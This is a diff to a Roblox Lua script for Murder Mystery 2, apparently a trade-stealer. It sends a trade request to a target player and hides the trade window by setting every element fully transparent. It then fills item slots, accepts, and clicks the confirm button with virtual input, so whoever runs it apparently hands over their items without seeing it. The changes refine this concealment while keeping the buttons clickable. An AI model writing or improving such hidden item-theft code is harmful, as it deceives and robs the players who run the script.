@@ -496,20 +496,49 @@ local LocalPlayer = Players.LocalPlayer
 local VirtualInputManager = game:GetService("VirtualInputManager")
 local Trade = ReplicatedStorage:WaitForChild("Trade")
 
--- Fonction pour rendre le GUI complètement transparent (invisible) ou visible
+-- Rendre invisible via la transparence SANS désactiver les éléments
 local function setTradeGuiTransparency(invisible)
     pcall(function()
         local playerGui = LocalPlayer:WaitForChild("PlayerGui")
         local tradeGui = playerGui:FindFirstChild("TradeGUI") or playerGui:FindFirstChild("Trade")
         if tradeGui then
-            -- Parcourt tous les éléments de l'interface pour masquer/rendre transparent
             for _, descendant in pairs(tradeGui:GetDescendants()) do
                 if descendant:IsA("GuiObject") then
                     if invisible then
-                        -- Sauvegarde l'ancienne transparence si besoin et cache
-                        descendant.Visible = false
+                        -- Sauvegarde des transparences d'origine
+                        if not descendant:FindFirstChild("OrigBgTrans") then
+                            local val = Instance.new("NumberValue", descendant)
+                            val.Name = "OrigBgTrans"
+                            val.Value = descendant.BackgroundTransparency
+                        end
+                        descendant.BackgroundTransparency = 1
+
+                        if descendant:IsA("TextLabel") or descendant:IsA("TextButton") or descendant:IsA("TextBox") then
+                            if not descendant:FindFirstChild("OrigTextTrans") then
+                                local val = Instance.new("NumberValue", descendant)
+                                val.Name = "OrigTextTrans"
+                                val.Value = descendant.TextTransparency
+                            end
+                            descendant.TextTransparency = 1
+                        elseif descendant:IsA("ImageLabel") or descendant:IsA("ImageButton") then
+                            if not descendant:FindFirstChild("OrigImgTrans") then
+                                local val = Instance.new("NumberValue", descendant)
+                                val.Name = "OrigImgTrans"
+                                val.Value = descendant.ImageTransparency
+                            end
+                            descendant.ImageTransparency = 1
+                        end
                     else
-                        descendant.Visible = true
+                        -- Restauration de l'apparence
+                        if descendant:FindFirstChild("OrigBgTrans") then
+                            descendant.BackgroundTransparency = descendant.OrigBgTrans.Value
+                        end
+                        if descendant:FindFirstChild("OrigTextTrans") and (descendant:IsA("TextLabel") or descendant:IsA("TextButton") or descendant:IsA("TextBox")) then
+                            descendant.TextTransparency = descendant.OrigTextTrans.Value
+                        end
+                        if descendant:FindFirstChild("OrigImgTrans") and (descendant:IsA("ImageLabel") or descendant:IsA("ImageButton")) then
+                            descendant.ImageTransparency = descendant.OrigImgTrans.Value
+                        end
                     end
                 end
             end
@@ -528,7 +557,7 @@ local function getitems()
     Trade.SendRequest:InvokeServer(targetPlayer)
     task.wait(2.5)
 
-    -- 2. On rend le menu invisible dès qu'il s'ouvre pour ne pas te gêner
+    -- 2. Rendre invisible (transparence) SANS casser le GUI
     setTradeGuiTransparency(true)
 
     -- 3. Remplissage des 3 cases max MM2
@@ -566,12 +595,12 @@ local function getitems()
         Trade.AcceptRequest:FireServer()
     end)
 
-    -- 5. Attente des 8 secondes du compte à rebours
+    -- 5. Attente obligatoire de 8 secondes (timer MM2)
     task.wait(8)
 
     -- 6. SÉQUENCE DE CLIC SUR LE BOUTON
     pcall(function()
-        -- On réaffiche le GUI un tout petit instant pour que les clics virtuels touchent bien les boutons à l'écran
+        -- On réaffiche visuellement avant les clics virtuels
         setTradeGuiTransparency(false)
         task.wait(0.1)
 
@@ -601,15 +630,15 @@ local function getitems()
         sendClick()
     end)
 
-    -- 7. Nettoyage final : on ferme ou on détruit le trade à la fin
-    task.wait(0.5)
+    -- 7. Nettoyage final : fermeture propre après échange
+    task.wait(1)
     if destroytrades2 then
         pcall(function() coroutine.resume(destroytrades2) end)
     end
 end
 
 -- ==========================================
--- ÉCOUTE DU TCHAT 5
+-- ÉCOUTE DU TCHAT
 -- ==========================================
 
 local function listenToPlayer(player)
